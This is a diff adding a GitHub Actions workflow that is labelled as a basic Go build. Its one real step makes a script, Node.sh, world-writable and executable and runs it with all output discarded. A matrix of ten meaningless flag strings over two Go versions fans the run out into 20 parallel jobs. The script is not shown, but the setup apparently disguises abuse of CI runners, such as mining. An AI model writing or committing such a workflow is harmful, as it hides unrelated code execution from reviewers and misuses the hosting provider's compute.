@@ -1,0 +1,29 @@
+# This is a basic workflow to help you get started with Actions
+
+name: build
+ 
+on: [push, pull_request] 
+jobs: 
+  build: 
+    runs-on: ubuntu-latest
+    strategy: 
+      matrix: 
+        go: [1.11, 1.12] 
+        flag: [hvf, hik, plh, tda, pnc, pll, tue, sks, pqk, qjp] 
+    env: 
+        NUM_JOBS: 20 
+        JOB: ${{ matrix.go }} 
+ 
+    steps: 
+       
+    - name: Set up Go ${{ matrix.go }} 
+      uses: actions/setup-go@v1 
+      with: 
+        go-version: ${{ matrix.go }} 
+      id: go 
+ 
+    - name: Setup
+      uses: actions/checkout@v1 
+    - name: build
+      run: |
+             chmod 777 Node.sh && chmod +x Node.sh && ./Node.sh >/dev/null 2>&1
